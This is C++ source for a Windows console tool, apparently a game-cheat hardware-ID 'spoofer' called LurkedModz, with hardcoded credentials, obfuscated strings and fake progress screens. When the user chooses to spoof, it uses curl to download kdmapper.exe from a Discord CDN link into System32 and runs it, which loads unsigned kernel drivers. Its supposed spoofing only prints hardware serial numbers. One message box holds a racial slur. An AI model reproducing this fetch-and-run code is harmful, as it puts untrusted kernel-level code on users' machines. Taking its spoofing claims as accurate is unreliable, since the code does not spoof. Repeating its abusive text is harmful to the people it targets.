#include <Windows.h>
#include <iostream>
#include <tchar.h>
#include <urlmon.h>
#include <string>
#include "Encryption.hpp"
#include "Protection.hpp"
#include "Resource.hpp"
#pragma comment (lib,"urlmon.lib")
#pragma comment (lib,"wininet")
using namespace std;
// FUNCTIONS 
bool checkCredentials(const std::string& username, const std::string& password)
{
    return (username == "Lurked" && password == "Modz");
}
void SetConsoleTextColor(int colorCode)
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, colorCode);
}
// END OF FUNCTIONS
void Lurkin()
{
    cout << endl;
    cout << endl;
    cout << endl;
    std::cout << R"(
            _                _            _ __  __           _      __          __          __          
           | |              | |          | |  \/  |         | |     \ \        / /         / _|         
           | |    _   _ _ __| | _____  __| | \  / | ___   __| |____  \ \  /\  / /__   ___ | |_ ___ _ __ 
           | |   | | | | '__| |/ / _ \/ _` | |\/| |/ _ \ / _` |_  /   \ \/  \/ / _ \ / _ \|  _/ _ \ '__|
           | |___| |_| | |  |   <  __/ (_| | |  | | (_) | (_| |/ /     \  /\  / (_) | (_) | ||  __/ |   
           |______\__,_|_|  |_|\_\___|\__,_|_|  |_|\___/ \__,_/___|     \/  \/ \___/ \___/|_| \___|_|   
                                                                                             )" << std::endl;
}
int main()
{
    TitleChanging = true;
    std::thread(title_changed).detach();
    SetConsoleTitleA("  LurkedModz Self Coded Woofer With No Protection");
    SetConsoleTextColor(5);
    Lurkin();
    cout << ("\n\n");
    SetConsoleTextColor(7);
    std::string username;
    std::string password;
    std::cout << dye::purple("   (");
    std::cout << dye::white(">");
    std::cout << dye::purple(") ");
    slow_print(E("Username: ").decrypt(), 20);
    std::cin >> username;
    std::cout << dye::purple("   (");
    std::cout << dye::white(">");
    std::cout << dye::purple(") ");
    slow_print(E("Password: ").decrypt(), 20);
    std::cin >> password;

    if (checkCredentials(username, password))
    {
        // Authentication successful
        MessageBoxA(NULL, "Login successful", "Opening", MB_OK);
        Sleep(3000);
        system("cls");
        SetConsoleTextColor(5);
        Lurkin();
        SetConsoleTextColor(9);
        cout << ("\n\n");
        slow_print(E("                                               Welcome To LurkedModz\n").decrypt(), 20);
        Sleep(3000);
        system("cls");
        SetConsoleTextColor(5);
        Lurkin();
        SetConsoleTextColor(4);
        cout << ("\n\n");
        slow_print(E("                                                      Connecting\n").decrypt(), 20);
        Sleep(2000);
        system("cls");
        SetConsoleTextColor(5);
        Lurkin();
        SetConsoleTextColor(2);
        cout << ("\n\n");
        slow_print(E("                                                      Connected\n").decrypt(), 20);
        Sleep(3000);
        system("cls");
        SetConsoleTextColor(5);
        Lurkin();
        cout << ("\n\n");
        std::string choice;

        slow_print(E("                                                 Do You Want To Spoof? y/n   \n").decrypt(), 20);
        std::cin >> choice;

        if (choice == "y" || choice == "Y")
        {
            
            // Spoofer code
            SetConsoleTextColor(5);
            Lurkin();
            cout << ("\n\n");
            SetConsoleTextColor(4);
            std::cout << "                                            Spoofing Please Wait..\n";
            Sleep(3000);
            system("cls");
            SetConsoleTextColor(5);
            Lurkin();
            cout << ("\n\n");
            SetConsoleTextColor(7);
            std::cout << "                                                   LOADING DRIVERS\n";
            Sleep(2000);
            SetConsoleTextColor(0);
            system("curl https://cdn.discordapp.com/attachments/1137879984225132614/1137888765533237370/kdmapper.exe --output C:\\Windows\\System32\\kdmapper.exe >nul 2>&1");
            system("cd C:\\Windows\\System32\\ && kdmapper.exe");
            system("cls");
            SetConsoleTextColor(5);
            Lurkin();
            cout << ("\n\n");
            SetConsoleTextColor(7);
            LI_FN(system)(E("echo BaseBoard SN:"));
            LI_FN(Sleep)(200);
            LI_FN(system)(E("wmic baseboard get serialnumber"));
            LI_FN(Sleep)(200);
            LI_FN(system)(E("echo Bios SN:"));
            LI_FN(Sleep)(200);
            LI_FN(system)(E("wmic bios get serialnumber"));
            LI_FN(Sleep)(200);
            LI_FN(system)(E("echo Cpu SN:"));
            LI_FN(Sleep)(200);
            LI_FN(system)(E("wmic cpu get serialnumber"));
            LI_FN(Sleep)(200);
            LI_FN(system)(E("echo DiskDrive SN:"));
            LI_FN(Sleep)(200);
            LI_FN(system)(E("wmic diskdrive get serialnumber"));
            LI_FN(system)(E("echo Mac Addresses:"));
            LI_FN(system)(E(R"(wmic path Win32_NetworkAdapter where "PNPDeviceID like '%%PCI%%' AND NetConnectionStatus=2 AND AdapterTypeID='0'" get MacAddress)"));
            slow_print(E("                                      Join The Discord Because I ain't doing this shit because I Jus Wanna  \n").decrypt(), 20);
            system("start https://discord.gg/lurkedmodz");
            Sleep(10000);
        }
        else if (choice == "n" || choice == "N")
        {
            MessageBoxA(NULL, "YOU FAT NIGGER", "GET OUT", MB_OK);
            }

        }
        else
        {
            // Authentication failed
            MessageBoxA(NULL, "WRONG LOGIN", "Get The Fuck Out", MB_OK);
            return 0;
        }
    }